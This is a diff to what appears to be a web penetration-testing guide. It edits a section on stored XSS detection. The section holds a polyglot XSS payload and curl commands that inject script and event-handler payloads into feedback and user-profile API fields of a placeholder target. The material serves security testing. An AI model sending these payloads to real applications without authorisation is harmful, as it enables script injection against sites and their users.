@@ -75,15 +75,19 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/ /* */oNcliCk=alert(1) )//%0D%0A%0D%0A//</stYle
 ### Stored XSS Detection
 
 ```bash
-# Test stored XSS via feedback/review forms
+# Test stored XSS via feedback/review forms.
+# A <script> tag is the cleanest proof of real script execution (strongest
+# PoC). Event-handler vectors (<img onerror=…>, <svg onload=…>) are valid
+# fallbacks for WAF/attribute-context cases; try whichever vector the sink
+# actually renders.
 curl -X POST http://<target>/api/Feedbacks \
   -H "Content-Type: application/json" \
-  -d '{"comment":"<img src=x onerror=alert(document.domain)>","rating":1}'
+  -d '{"comment":"<script>alert(document.domain)</script>","rating":1}'
 
 # Test stored XSS via profile fields (username, bio)
 curl -X PUT http://<target>/api/Users/1 \
   -H "Content-Type: application/json" \
-  -H "Authorization: Bearer <token>" \
+  -H "Authorization: Bearer ***" \
   -d '{"username":"<script>alert(1)</script>"}'
 ```
 
